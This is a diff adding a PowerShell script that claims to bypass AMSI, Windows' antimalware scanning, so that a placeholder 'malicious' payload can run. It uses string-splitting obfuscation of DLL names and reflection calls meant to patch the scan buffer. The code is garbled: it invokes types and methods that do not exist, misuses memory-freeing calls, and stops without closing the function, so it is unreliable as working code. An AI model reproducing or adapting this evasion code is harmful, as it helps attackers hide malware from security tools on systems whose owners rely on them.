@@ -1,0 +1,41 @@
+# Define the malicious PowerShell script
+$maliciousScript = @"
+Function Invoke-Payload {
+    Write-Output 'Hello from the malicious code'
+}
+
+Invoke-Payload
+"@
+
+# Define the bypass function
+Function Bypass-AMSI {
+    param(
+        [string]$Script
+    )
+
+    # Convert the script to a byte array
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($Script)
+
+    # Patch the AMSI scan buffer to skip the script
+    $addr = [Ref][IntPtr]([System.IntPtr]::Zero)
+    $amsiDll = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() + 'am' + 'si.' + 'dll'
+    $ntdll = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() + 'nt' + 'dll.' + 'dll'
+    $pOpenProcess = ([System.Diagnostics.Process]).GetMethod('OpenProcess', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
+    $pVirtualProtectEx = ([System.Reflection.Assembly]::Load('System.Runtime.InteropServices.RuntimeInformation, Version=5.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a')).GetType('System.Runtime.InteropServices.RuntimeInformation').GetMethod('VirtualProtectEx', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
+    $processHandle = $pOpenProcess.Invoke($null, @([System.Diagnostics.ProcessAccessRights]::AllAccess, $false, [System.Diagnostics.Process]::GetCurrentProcess().Id))
+    $kernel32 = [System.Reflection.Assembly]::Load('System.Runtime.InteropServices.RuntimeInformation, Version=5.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a').GetType('System.Runtime.InteropServices.RuntimeInformation').GetMethod('LoadLibrary', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static).Invoke($null, @($ntdll))
+    $virtualProtectEx = $pVirtualProtectEx.Invoke($null, @([System.Runtime.InteropServices.Marshal]::GetHINSTANCE($kernel32), [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($addr), [IntPtr]4, 64, [Ref][UInt32]0))
+    $amsiModule = [System.Reflection.Assembly]::LoadFile($amsiDll)
+    $amsiSession = $amsiModule.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiOpenSession').Invoke($null, $null)
+    $amsiScanBuffer = $amsiModule.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
+    $amsiContext = [System.IntPtr]::Zero
+    $amsiSession.Invoke($amsiContext, @('Powershell bypass'), [Ref]$amsiContext)
+    $result = $amsiScanBuffer.Invoke($null, @($amsiContext, [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length), $bytes.Length, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($addr), [Ref][Int64]0))
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($result)
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($addr)
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($processHandle)
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($kernel32)
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($virtualProtectEx)
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($amsiSession)
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($amsiScanBuffer)
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($amsiContext)
